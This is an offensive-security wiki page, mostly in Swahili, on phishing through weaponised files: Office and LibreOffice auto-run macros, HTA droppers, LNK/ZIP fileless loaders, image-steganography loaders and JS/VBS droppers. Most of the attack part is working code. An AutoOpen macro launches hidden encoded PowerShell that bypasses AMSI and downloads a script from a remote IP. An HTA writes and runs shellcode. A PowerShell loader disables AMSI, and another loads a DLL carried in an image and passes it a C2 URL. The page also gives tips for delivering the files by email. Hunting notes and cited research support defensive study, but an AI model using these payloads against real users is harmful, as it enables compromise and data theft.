# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Iwapo hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadili jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wao wa kuendesha macros.\
Kwa mfano, faili ya RTF haiungi mkono macros, kwa muundo wake, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Mifumo na mekanizimu zilezile za ndani zinatumika kwa software yote ya Microsoft Office Suite (Excel, PowerPoint etc.).

Unaweza kutumia amri ifuatayo kuangalia ni viendelezi gani vitatekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) ambayo inajumuisha macros zinaweza pia “kutekeleza” macros.

### External Image Load

Nenda: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha code yoyote kutoka kwenye document.

#### Autoload functions

Kadiri zinavyokuwa za kawaida zaidi, ndivyo uwezekano mkubwa AV itazigundua.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mikono

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bofya **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Doc Extension

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, badilisha format kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** **kuhusu** extension ya **`.docm`** inayowezesha macros (mfano, thumbnail icon ina `!` kubwa na baadhi ya web/email gateway huzi-block kabisa). Kwa hiyo, hii **legacy `.doc` extension** ndiyo **best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents zinaweza kupachika Basic macros na kuzi-execute moja kwa moja zinapofunguliwa kwa ku-binda macro kwenye event ya **Open Document** (Tools → Customize → Events → Open Document → Macro…). Macro rahisi ya reverse shell inaonekana hivi:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Tambua nukuu zilizoongezwa mara mbili (`""`) ndani ya string – LibreOffice Basic huzitumia kuficha literal quotes, hivyo payloads zinazoishia kwa `...==""")` huweka command ya ndani na argument ya Shell vikiwa balanced.

Vidokezo vya delivery:

- Hifadhi kama `.odt` na funga macro kwenye event ya document ili ianze mara moja inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, si string ya jina la faili, zitumwe kama attachment). Hii ni muhimu sana unapoitumia vibaya SMTP servers zinazokubali recipients wa `RCPT TO` bila validation.

## HTA Files

HTA ni programu ya Windows inayochanganya HTML na scripting languages (kama VBScript na JScript). Huunda user interface na hutekeleza kama application "fully trusted", bila vikwazo vya usalama vya browser.

HTA hutekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo **`mshta` hutegemea IE**. Kwa hiyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye emails au HTML ambazo mtumiaji atafikia (hata HTTP MitM?). Au mtumie mhasiriwa **anwani ya files** ambazo **zitachochea** **authentication** kwa ajili ya **kufungua folder** pekee.

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au authentication bali pia unaweza **kutekeleza NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zenye ufanisi mkubwa huwasilisha ZIP ambayo ina hati mbili halali za chambo (PDF/DOCX) na .lnk yenye nia mbaya. Ujanja ni kwamba PowerShell loader halisi huhifadhiwa ndani ya bytes ghafi za ZIP baada ya marker ya kipekee, na .lnk huiokota na kuiendesha kikamilifu kwenye memory.

Mtiririko wa kawaida uliotekelezwa na one-liner ya PowerShell ya .lnk:

1) Tafuta ZIP ya asili kwenye paths za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent wa current working directory.
2) Soma bytes za ZIP na upate marker iliyowekwa hardcoded (mfano, xFIQCV). Kila kitu baada ya marker ni embedded PowerShell payload.
3) Nakili ZIP kwenda %ProgramData%, ifute hapo, na fungua .docx ya chambo ili ionekane halali.
4) Pita AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa obfuscation ya stage inayofuata (mfano, ondoa herufi zote #) na uitekeleze kwenye memory.

Mfano wa skeleton ya PowerShell ya kuokota na kuendesha stage iliyopachikwa:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery mara nyingi hutumia vibaya subdomains za PaaS zenye sifa nzuri (k.m. *.herokuapp.com) na huenda zikazuia payloads (kutoa ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi hufungua base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza artifacts za disk.

Persistence iliyotumiwa katika mnyororo huohuo
- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au app yoyote inayoiingiza izindue payload upya kiotomatiki. Angalia maelezo na commands tayari-kutumia hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files zenye ASCII marker string (k.m. xFIQCV) iliyoongezwa mwishoni mwa data ya archive.
- .lnk ambayo huhesabu parent/user folders ili kutafuta ZIP na kufungua decoy document.
- AMSI tampering kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads zinazomalizika kwa links zilizohostiwa chini ya trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Mfumo mwingine unaojirudia ni **`.lnk` inayojifanya document** ambayo hufungua mara moja lure isiyo na madhara huku ikiweka chain halisi nyuma kwa nyuma.

Workflow iliyozingatiwa:
1. Shortcut **hujifanya PDF** na hutumia conhost.exe au proxy inayofanana kuzindua obfuscated PowerShell downloader.
2. PowerShell hugawa tokens dhahiri (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili detections za kawaida zinazotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` zishindwe kuona command.
3. Stager hupakua **decoy document kwanza**, huifungua kwa mhanga, kisha hujenga upya malicious files nyuma kwa nyuma.
4. Payloads huenda zikandikwa kwa **junk extensions** kisha kubadilishwa jina kwa kuondoa filler characters, hivyo kuchelewesha kuonekana kwa artifacts dhahiri za `.exe` / `.cpl`.
5. Persistence huwekwa kwa **scheduled task ya kila dakika** inayozindua trusted host binary kutoka kwenye path inayoweza kuandikiwa na user.

Vidokezo vidogo vya hunting kutoka kwenye pattern hii:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Tengenezo ya staging inayofaa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini stage ya pili ni ya siri

Katika case study ya Rapid7, scheduled task ilizindua mara kwa mara **`Fondue.exe`** kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa karibu nayo na kusafirisha **`RunFODW`**, binary ya Microsoft iliyoaminika ili side-load CPL ya mshambuliaji badala ya nakala halali ya mfumo.

Kisha CPL:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Huyasimbua kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga executable memory na kunakili shellcode iliyosimbuliwa
- Huitoa kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback kwa **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kuwindwa kivyake: malware mara nyingi huepuka direct `((void(*)())buf)()` jump na badala yake hutumia **legitimate callback-taking WinAPI** ili kuhamisha execution.

Payload iliyosimbuliwa katika kampeni hii ilikuwa **Donut** shellcode, ambayo kisha ilimapa final PE kikamilifu kwenye memory na kubandika **AMSI/WLDP/ETW** katika current process kabla ya kukabidhi execution. Kwa maelezo ya kina zaidi kuhusu side-loading na memory-resident post-processing, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Mielekeo ya uwindaji ya vitendo:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe` ikifuatiwa na decoy document inayoonekana.
- Downloads za muda mfupi kwenda **`C:\Users\Public\`** zikifuatiwa mara moja na renames kutoka kwa extensions zisizo na maana.
- Scheduled tasks zenye majina ya kawaida kama `GoogleErrorReport` zikitekelezwa kutoka **user-writable directories**.
- Trusted binaries zinazopakia faili za **`.cpl` / `.dll`** kutoka directory ileile isiyo ya mfumo.
- Base64 text blobs zilizoandikwa chini ya **`C:\Windows\Tasks\`** kisha kusomwa na module iliyoside-loadiwa.

## Steganography-delimited payloads katika images (PowerShell stager)

Mifumo ya loader ya hivi karibuni hupeleka obfuscated JavaScript/VBS inayodesha na kuendesha Base64 PowerShell stager. Hiyo stager hupakua image (mara nyingi GIF) ambayo ina .NET DLL iliyoandikwa kwa Base64 iliyofichwa kama plain text kati ya unique start/end markers. Script hutafuta delimiters hizi (examples zilizoonekana kwa vitendo: «<<sudo_png>> … <<sudo_odt>>>»), huchukua maandishi ya kati, huyadesha Base64 kuwa bytes, hu-load assembly ndani ya memory na kuita known entry method kwa C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → hudesha embedded Base64 → huzindua PowerShell stager na -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → hupakua image, hukata Base64 iliyozungukwa na marker, hu-load .NET DLL ndani ya memory na kuita method yake (e.g., VAI) ikipitisha C2 URL na options.
- Stage 3: Loader hupata final payload na kwa kawaida huiinject kupitia process hollowing ndani ya trusted binary (kawaida MSBuild.exe). Tazama zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kutoa DLL kutoka kwenye image na kuita method ya .NET ndani ya memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Alama hubadilika kati ya kampeni.
- AMSI/ETW bypass na string deobfuscation hutumika kwa kawaida kabla ya kupakia assembly.
- Hunting: chunguza picha zilizopakuliwa kwa delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja kusimba Base64 blobs.

Tazama pia stego tools na carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Hatua ya awali inayojirudia ni `.js` au `.vbs` ndogo, iliyofichwa sana, inayotolewa ndani ya archive. Kusudi lake pekee ni kusimba string ya Base64 iliyopachikwa na kuzindua PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.

Mantiki ya skeleton (abstract):
- Soma maudhui ya faili yake yenyewe
- Tafuta blob ya Base64 kati ya junk strings
- Simba kwenda ASCII PowerShell
- Tekeleza kwa `wscript.exe`/`cscript.exe` ikiita `powershell.exe`

Viashiria vya hunting
- Viambatisho vya JS/VBS vilivyowekwa kwenye archive vikizalisha `powershell.exe` na `-enc`/`FromBase64String` kwenye command line.
- `wscript.exe` ikizindua `powershell.exe -nop -w hidden` kutoka paths za temp za mtumiaji.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
